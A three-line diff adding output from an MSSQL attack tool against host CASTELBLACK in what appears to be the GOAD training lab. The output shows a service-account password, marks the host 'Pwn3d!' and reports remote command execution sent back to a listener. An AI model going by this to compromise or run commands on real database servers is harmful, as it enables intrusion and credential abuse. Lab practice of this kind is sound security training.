@@ -1,0 +1,3 @@
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 (2019 RTM 15.0.2000) (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (EncryptionReq:False) 
+MSSQL                    192.168.56.22   1433   CASTELBLACK      [+] north.sevenkingdoms.local\sql_svc:YouWillNotKerboroast1ngMeeeeee (Pwn3d!)
+MSSQL_CO...              192.168.56.22   1433   CASTELBLACK      [*] Commands executed successfully, check the listener for results
